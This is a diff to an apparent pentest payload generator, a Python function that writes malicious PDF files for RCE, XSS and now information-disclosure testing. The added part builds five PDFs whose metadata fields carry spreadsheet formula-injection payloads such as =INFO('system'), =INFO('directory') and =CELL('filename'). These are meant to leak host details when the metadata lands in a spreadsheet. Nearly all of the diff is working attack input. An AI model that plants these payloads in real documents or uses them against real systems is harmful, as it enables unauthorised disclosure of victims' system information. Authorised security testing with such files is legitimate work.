@@ -27,6 +27,8 @@ def generate_pdf_payloads(output_dir, burp_collab):
     rce_dir.mkdir(exist_ok=True)
     xss_dir = output_dir / 'xss'
     xss_dir.mkdir(exist_ok=True)
+    info_dir = output_dir / 'info'
+    info_dir.mkdir(exist_ok=True)
     
     pdf_header = b'%PDF-1.4\n'
     pdf_trailer = b'\n%%EOF'
@@ -2005,6 +2007,246 @@ startxref
 %%EOF'''
     with open(xss_dir / "xss12_js_simple.pdf", 'wb') as f:
         f.write(pdf_xss12_js_simple.encode())
+    
+    pdf_info1_cell_filename = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Info 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Title (Info Disclosure: CELL filename)
+/Author (=CELL("filename"))
+/Subject (=CELL("filename"))
+/Keywords (=CELL("filename"))
+/Creator (=CELL("filename"))
+/Producer (=CELL("filename"))
+/CreationDate (D:20240101000000Z)
+/ModDate (D:20240101000000Z)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+/Info 3 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(info_dir / "info1_cell_filename.pdf", 'wb') as f:
+        f.write(pdf_info1_cell_filename.encode())
+    
+    pdf_info2_info_version = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Info 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Title (Info Disclosure: INFO version)
+/Author (=INFO("version"))
+/Subject (=INFO("version"))
+/Keywords (=INFO("version"))
+/Creator (=INFO("version"))
+/Producer (=INFO("version"))
+/CreationDate (D:20240101000000Z)
+/ModDate (D:20240101000000Z)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+/Info 3 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(info_dir / "info2_info_version.pdf", 'wb') as f:
+        f.write(pdf_info2_info_version.encode())
+    
+    pdf_info3_info_system = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Info 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Title (Info Disclosure: INFO system)
+/Author (=INFO("system"))
+/Subject (=INFO("system"))
+/Keywords (=INFO("system"))
+/Creator (=INFO("system"))
+/Producer (=INFO("system"))
+/CreationDate (D:20240101000000Z)
+/ModDate (D:20240101000000Z)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+/Info 3 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(info_dir / "info3_info_system.pdf", 'wb') as f:
+        f.write(pdf_info3_info_system.encode())
+    
+    pdf_info4_now = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Info 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Title (Info Disclosure: NOW)
+/Author (=NOW())
+/Subject (=NOW())
+/Keywords (=NOW())
+/Creator (=NOW())
+/Producer (=NOW())
+/CreationDate (D:20240101000000Z)
+/ModDate (D:20240101000000Z)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+/Info 3 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(info_dir / "info4_now.pdf", 'wb') as f:
+        f.write(pdf_info4_now.encode())
+    
+    pdf_info5_info_directory = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Info 3 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Title (Info Disclosure: INFO directory)
+/Author (=INFO("directory"))
+/Subject (=INFO("directory"))
+/Keywords (=INFO("directory"))
+/Creator (=INFO("directory"))
+/Producer (=INFO("directory"))
+/CreationDate (D:20240101000000Z)
+/ModDate (D:20240101000000Z)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+/Info 3 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(info_dir / "info5_info_directory.pdf", 'wb') as f:
+        f.write(pdf_info5_info_directory.encode())
     
     pdf_rce3_openDoc = f'''%PDF-1.4
 1 0 obj
